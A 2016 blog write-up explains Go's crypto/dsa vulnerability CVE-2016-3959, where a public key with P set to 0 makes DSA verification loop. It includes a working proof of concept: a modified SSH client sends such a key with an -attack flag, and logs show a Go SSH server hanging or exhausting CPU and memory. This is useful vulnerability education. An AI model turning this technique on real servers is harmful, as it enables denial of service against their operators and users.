# A Summary of Go's crypto/dsa Vulnerability (CVE-2016-3959)

Alex Mullins

April 9, 2016

--------------------------------------------------------------------------------

## Introduction

Recently, there was a bug discovered in the Digital Signature Algorithm (DSA) crypto library for the Go programming language. In this article we'll go over the details of the bug and how an attacker could leverage it to initiate a denial of service attack against a standard Go SSH server that uses the underlying DSA library to authenticate clients.

The first mention of this vulnerability appeared in a post on the Open Source Security (oss-sec) Mailing List at <http://seclists.org/oss-sec/2016/q2/11>.

> Go has an infinite loop in several big integer routines that makes Go programs vulnerable to remote denial of service attacks.  Programs using HTTPS client authentication or the Go ssh server libraries are both exposed to this vulnerability. This is being addressed in the following CL: <https://golang.org/cl/21533>

> -- <cite>Jason Buberel</cite>

In summary, if this vulnerability were exploited, it could lead to an infinite loop in the underlying BigNum library code. This will eat up system resources in terms of CPU and memory and could eventually cause the program or the system itself to become unresponsive.

The above statement says that SSH along with HTTPS client authentication are affected, but after looking at Go's crypto/tls and net/http packages that appears to be incorrect. HTTPS client authentication can use either RSA or ECDSA signature schemes, but not DSA. See below. If I am wrong about this please let me know.

<https://golang.org/pkg/crypto/tls/#Certificate>

```go
type Certificate struct {
        Certificate [][]byte
        // PrivateKey contains the private key corresponding to the public key
        // in Leaf. For a server, this must implement crypto.Signer and/or
        // crypto.Decrypter, with an RSA or ECDSA PublicKey. For a client
        // (performing client authentication), this must be a crypto.Signer
        // with an RSA or ECDSA PublicKey.
        PrivateKey crypto.PrivateKey

        ... other fields
}
```

Not long after that post appeared on the oss-sec mailing list, a CVE number was issued: CVE-2016-3959. The Go maintainers have a fix ready for this and will appear in versions 1.5.4 and 1.6.1 that are to be released on Wednesday, April 13, 2016; <https://groups.google.com/forum/#!topic/golang-nuts/MmSbFHLPo8g>.

To follow along with the code samples in this article you'll need Go version 1.6 installed. Follow the instruction at <https://golang.org/doc/install>. If you want to download this document and the code samples you'll need Git installed too. Follow the instructions at <https://git-scm.com/book/en/v2/Getting-Started-Installing-Git>. To clone the repository issue the following command in a terminal:

```bash
$ go get github.com/alexmullins/dsa
```

This will clone the repository into your Go workspace.

The next section will cover the details of the vulnerability.

## The Flaw

So what exactly is wrong? To answer that, one must go back to the original announcement on the oss-sec mailing list. There isn't much information there other than a general explanation of the problem and a link to the code fix at <https://golang.org/cl/21533>. The commit message for that change contains the following:

> crypto/dsa: eliminate invalid PublicKey early

> For PublicKey.P == 0, Verify will fail. Don't even try.

> --- <cite>Robert Griesemer</cite>

and the fixed code:

<https://github.com/golang/go/blob/master/src/crypto/dsa/dsa.go#L247>

```go
// Verify verifies the signature in r, s of hash using the public key, pub. It
// reports whether the signature is valid.
//
// Note that FIPS 186-3 section 4.6 specifies that the hash should be truncated
// to the byte-length of the subgroup. This function does not perform that
// truncation itself.
func Verify(pub *PublicKey, hash []byte, r, s *big.Int) bool {
    // FIPS 186-3, section 4.7

    // Code fix added to check if the key parameters are sensible.
    if pub.P.Sign() == 0 {
        return false
    }

    if r.Sign() < 1 || r.Cmp(pub.Q) >= 0 {
        return false
    }
    if s.Sign() < 1 || s.Cmp(pub.Q) >= 0 {
        return false
    }

    w := new(big.Int).ModInverse(s, pub.Q)

    n := pub.Q.BitLen()
    if n&7 != 0 {
        return false
    }
    z := new(big.Int).SetBytes(hash)

    u1 := new(big.Int).Mul(z, w)
    u1.Mod(u1, pub.Q)
    u2 := w.Mul(r, w)
    u2.Mod(u2, pub.Q)
    v := u1.Exp(pub.G, u1, pub.P)
    u2.Exp(pub.Y, u2, pub.P)
    v.Mul(v, u2)
    v.Mod(v, pub.P)
    v.Mod(v, pub.Q)

    return v.Cmp(r) == 0
}
```

To sum up the commit message and the code fix above: in Go 1.6 and previous versions there is a bug in the Verify function of the crypto/dsa package. If someone calls Verify with the public key parameter P set to 0 then it will cause an infinite loop in one of the statements further down in the Verify function.

A brief detour to explain DSA. DSA is a digital signature algorithm that uses asymmetric cryptography to sign a message which can later be used to guarantee that the message was in fact sent by the sender/private key holder. A simple example, Alice sends a message to Bob telling him where and when they should both meet for lunch. Bob though, wants to be sure that Alice is really the one that sent him the message and not someone else. For this to work Alice will sign the message with her private key and Bob can verify Alice's signature with her public key that Bob knows. No one other than the private key holder can sign a message that can then be verified by the corresponding public key (that's the idea at least).

To work, DSA needs 5 large numbers. The first 3 numbers are known as the DSA parameters P, Q, and G. These define the underlying group and the group generator. These numbers can be properly created with a call to dsa.GenerateParameters().

```go
type Parameters struct {
        P, Q, G *big.Int
}
```

The last two numbers needed for DSA are the private key X and the corresponding public key Y. These numbers can also be created with a call to dsa.GenerateKey().

```go
type PrivateKey struct {
        PublicKey
        X *big.Int
}

type PublicKey struct {
        Parameters
        Y *big.Int
}
```

That is all that you need to know about DSA to follow along. For more information see the NIST standard: <http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf> or the wikipedia page: <https://en.wikipedia.org/wiki/Digital_Signature_Algorithm>.

Back on topic; where is the infinite loop at in the Verify function? With a little more digging you will find that the code hangs on:

```go
v := u1.Exp(pub.G, u1, pub.P)
```

This is the comment for the Exp() method:

```go
// Exp sets z = x**y mod |m| (i.e. the sign of m is ignored), and returns z.
// If y <= 0, the result is 1 mod |m|; if m == nil or m == 0, z = x**y.
// See Knuth, volume 2, section 4.6.3.
func (z *Int) Exp(x, y, m *Int) *Int {
```

From the above, you can see the comment specifies that when m == 0 that it will exponentiate without modular reduction. When you take a large number and exponentiate it with another large number then the result will also be a REALLY BIG number. I'm not too familiar with how math/big works, but I think that is what is going on here. Exp() is crunching away at this exponentiation that will take a very, very long time to complete (might as well be infinity).

Here are some sample numbers being used in a dsa.Verify() call to Exp() gathered from the testing code below:  

```
x = 87134495734400160760614045850064869082246125869475484226357302998590334523718907040547736115253396811403341841812955872027275698952059512800196447089300992352859585665865224989740
07948775031938554271780506269767106717359222697821209685947889925442133804051298762702245652821695254167558015585995918548052076 (307 digits)

y = 751336012463178371212581620103057049388105279629 (48 digits)

z = x ^ y
```

Using Wolfram Alpha, one can get a sense of how big this number z is. There are "113406800566837208055789635448879116719378036793444 or 1.13407x10^50 decimal digits" in the resulting number z. (note: could only use the leading 150 digits of x raised to y in the web input box on Wolfram Alpha so the actual number of digits is even more!) To give an idea of the scale: scientists estimate the number of atoms in the universe close to 10^78 to 10^82 <http://www.universetoday.com/36302/atoms-in-the-universe/>.

Example test of DSA sign/verify:

```go
func generatePrivKey(t *testing.T) *dsa.PrivateKey {
    // Create the DSA parameters
    params := dsa.Parameters{}
    err := dsa.GenerateParameters(&params, rand.Reader, dsa.L1024N160)
    if err != nil {
        t.Fatalf("failed to generate dsa parameters: %v", err)
    }

    // Create the DSA private/public keys
    priv := new(dsa.PrivateKey)
    priv.Parameters = params
    err = dsa.GenerateKey(priv, rand.Reader)
    if err != nil {
        t.Fatalf("failed to generate dsa keys: %v", err)
    }
    return priv
}

func TestDSASignature(t *testing.T) {
    var message = "Hello brave new world!"
    var hash = sha1.Sum([]byte(message))
    var err error

    priv := generatePrivKey(t)

    // Sign a message
    r, s, err := dsa.Sign(rand.Reader, priv, hash[:])
    if err != nil {
        t.Fatalf("failed to sign message: %v", err)
    }

    if !dsa.Verify(&priv.PublicKey, hash[:], r, s) {
        t.Fatalf("failed to verify message: %v", err)
    }
}
```

```bash
$ go test
PASS
ok      github.com/alexmullins/dsa    0.224s
```

Example test setting P to 0:

```go
func TestDSAPanic(t *testing.T) {
    flag.Parse()
    if !*fail {
        t.Skip()
    }

    var message = "Hello brave new world!"
    var hash = sha1.Sum([]byte(message))
    var err error

    priv := generatePrivKey(t)

    // Sign a message
    r, s, err := dsa.Sign(rand.Reader, priv, hash[:])
    if err != nil {
        t.Fatalf("failed to sign message: %v", err)
    }

    // Set P = 0
    priv.P = new(big.Int).SetInt64(0)

    if !dsa.Verify(&priv.PublicKey, hash[:], r, s) {
        t.Fatalf("failed to verify message: %v", err)
    }
}
```

```bash
$ go test -fail
```

Observe that this last test call will hang.

## Exploitation

How can someone exploit this? If an attacker can somehow get a server to accept and use a malformed DSA key to Verify a signature, he/she can influence the server to become stuck crunching away at a large exponentiation problem thereby causing a denial of service (DOS). Since SSH uses DSA as a signature scheme in its client authentication protocol, this seems like a perfect server candidate to try this exploit out against. Let's imagine up a scenario in which this could happen.

A small Git hosting provider allows its users to authenticate with SSH keys to its service and their SSH server is coded in Go. To bring this service down an attacker could create numerous fake accounts and upload malformed DSA keys for use in the SSH authentication. All these keys will have their parameter P set to 0. An attacker could then start hundreds of such SSH client connections to the server causing system resources to be locked up leading to an effective DOS.

Let's test out that scenario.

### The Server

The server is a simple SSH server that accepts session requests and prints the current time to the connection. Thanks to github.com/jpillora for providing this sample server code at <https://gist.github.com/jpillora/b480fde82bff51a06238>. There were a few adjustments made to the code to allow Public Key Authentication instead of password callbacks.

```go
config := &ssh.ServerConfig{
    // Accept all authentication requests
    PublicKeyCallback: func(c ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
        return nil, nil
    },
}
```

This will accept all public key authentication requests. Imagine a real service querying out to a database to determine whether a particular user has this public key registered under his/her account. The server looks like a very normal Go server that starts listening on a port and accepts connections coming in.

```go
// Once a ServerConfig has been configured, connections can be accepted.
listener, err := net.Listen("tcp", *addr)
if err != nil {
    log.Fatalf("Failed to listen on %s: %s", *addr, err)
}

// Accept all connections
log.Println("Listening on", *addr)
for {
    tcpConn, err := listener.Accept()
    if err != nil {
        log.Printf("Failed to accept incoming connection (%s)", err)
        return
    }
    log.Printf("Accepted an incoming TCP connection from %s", tcpConn.RemoteAddr())
    if *p {
        go makeSSHConn(tcpConn, config)
    } else {
        makeSSHConn(tcpConn, config)
    }

}

func makeSSHConn(conn net.Conn, config *ssh.ServerConfig) {
    // Before use, a handshake must be performed on the incoming net.Conn.
    sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
    if err != nil {
        log.Printf("Failed to handshake (%s)", err)
        return
    }

    log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())
    // Discard all global out-of-band Requests
    go ssh.DiscardRequests(reqs)
    // Accept all channels
    go handleChannels(chans)
}
```

One thing to notice is that `if *p` check. That corresponds to the `-p` flag and controls whether the server performs the SSH handshake on the main goroutine vs a background goroutine. Many online examples use the former. The `-p` flag will show the difference a blocking operation can have on the performance of a networked server in the attack section later.

### The Client

The client code is a little more involved. It needs modifications to the Go SSH library code to allow for sending a malformed DSA key. The SSH library has been vendored in to the client package. Note that the server code is all 100% unchanged and imports the regular golang.org/x/crypto/ssh package from the workspace.

The client works in two separate modes controlled by a command line flag called `-attack`. When the client is started normally, it will make a regular SSH connection to the server and start reading the server's time every few seconds. But when the `-attack` flag is present, the client will send an authentication request to the server with a malformed DSA public key. Relevant bits of code:

```go
func init() {
    flag.Parse()
    if *attack {
        ssh.Attack = true
    }
    if *key == "" {
        log.Fatalln("must provide a auth key.")
    }
}
```

Notice a new var `ssh.Attack` was created in the vendored SSH package and is set to true when the `-attack` flag is present. `ssh.Attack` changes the SSH package's DSA public key marshalling code to replace the P parameter to 0. You can find both of these changes in attack.go and keys.go files in the vendored SSH package.

```go
// attack.go
var (
    // Attack should be set to true to send a malformed DSA key.
    Attack = false
)

// keys.go
func (k *dsaPublicKey) Marshal() []byte {
    x := k.P
    if Attack {
        x = big.NewInt(0)
    }
    w := struct {
        Name       string
        P, Q, G, Y *big.Int
    }{
        k.Type(),
        x,
        k.Q,
        k.G,
        k.Y,
    }

    return Marshal(&w)
}
```

### The Attack

The attack has different impact depending on whether the server is started with the `-p` flag.

To build the server, cd into the server directory and run: `go build -o server .` Do the same for the client: `go build -o client .` There are test RSA and DSA keys in the server and client `data` directories. If you want to create new ones, use `ssh-keygen`.

#### Server - Main Goroutine

If the server was started without the `-p` flag, then one attacking client can completely freeze the server and no more new connections can be accepted. This is because the call to ssh.NewServerConn() is run on the main goroutine and is stuck in the call to dsa.Verify() for client authentication blocking further listener.Accept() calls. When writing networked servers, it is important to keep the accept loop responsive and push any blocking operations off into a background goroutine.

Start the server normally with:

```bash
$ ./server -key=./data/id_rsa
2016/04/13 07:30:27 Listening on localhost:8022
```

In another terminal start a client normally that will send a correct DSA key to the server for authentication:

```bash
$ ./client -key=./data/id_dsa
2016/04/13 07:31:31 connected
Wed Apr 13 07:31:34 CDT 2016
Wed Apr 13 07:31:37 CDT 2016
```

Swap back to the server and see that it has accepted the TCP conn and created a SSH conn:

```bash
$ ./server -key=./data/id_rsa
2016/04/13 07:31:23 Listening on localhost:8022
2016/04/13 07:31:31 Accepted an incoming TCP connection from 127.0.0.1:63516
2016/04/13 07:31:31 New SSH connection from 127.0.0.1:63516 (SSH-2.0-Go)
```

Now it's time to start an attacking client in another terminal. This will send the same DSA key that a normal client sends BUT will have the P parameter set to 0:

```bash
$ ./client -key=./data/id_dsa -attack
```

Notice the client just hangs without a 'connected' message and there are no logs of the server's time. The server also did not log creating an SSH connection, but it did accept the TCP connection. The server is now stuck on the call to dsa.Verify():

```bash
$ ./server -key=./data/id_rsa
2016/04/13 07:31:23 Listening on localhost:8022
2016/04/13 07:31:31 Accepted an incoming TCP connection from 127.0.0.1:63516
2016/04/13 07:31:31 New SSH connection from 127.0.0.1:63516 (SSH-2.0-Go)
2016/04/13 07:33:36 Accepted an incoming TCP connection from 127.0.0.1:63521
```

Try connecting another normal client; it is now prevented from connecting too:

```bash
$ ./client -key=./data/id_dsa
```

The original client is still able to receive responses from the server though.

#### Server - Background Goroutine

If the server was started with the `-p` flag, then it can still accept regular client connections because the attacker's SSH connections are being tied up in background goroutines instead of blocking the accept loop on the main goroutine. This doesn't lead to an immediate DOS, but will continually eat up the server's CPU and memory resources leading to a slow death.

Let's start up the server again, but this time with the `-p` flag:

```bash
$ ./sshd -key=./data/id_rsa -p
2016/04/13 07:38:07 Listening on localhost:8022
```

Now start up an attacking client like before:

```bash
$ ./client -key=./data/id_dsa -attack
```

Notice that the server didn't log creating the SSH connection again, but let's try connecting a regular client:

```bash
$ ./client -key=./data/id_dsa
2016/04/13 07:42:06 connected
Wed Apr 13 07:42:09 CDT 2016
Wed Apr 13 07:42:12 CDT 2016
```

Hey it connects! But all an attacker would need to do is start a few more malicious client connections and the server's CPU and RAM usage will spike. With 4 attacking clients I was able to get ~400% CPU and 1GB of RAM usage before stopping due to my laptop getting a little toasty. Under normal conditions with just 2 normal clients connected to the server my CPU was around 0.2% and RAM usage was 5-6MB. Quite a difference.

## Conclusion

In conclusion, this vulnerability can be exploited to cause denial of service. Using the scenario above, the CVE score calculator <https://nvd.nist.gov/CVSS/v2-calculator> gave a score of 3.5/10. There aren't any confidentiality or integrity impacts, just a partial/complete availability impact.

Looking at godoc.org there are currently 164 packages that import `crypto/dsa`, <https://godoc.org/crypto/dsa?importers>. It is recommended to upgrade to the security release that is at <https://golang.org/dl/>.

Overall this was a fun learning experience. If there are any mistakes or improvements that can be made, please let me know. Thanks for reading.
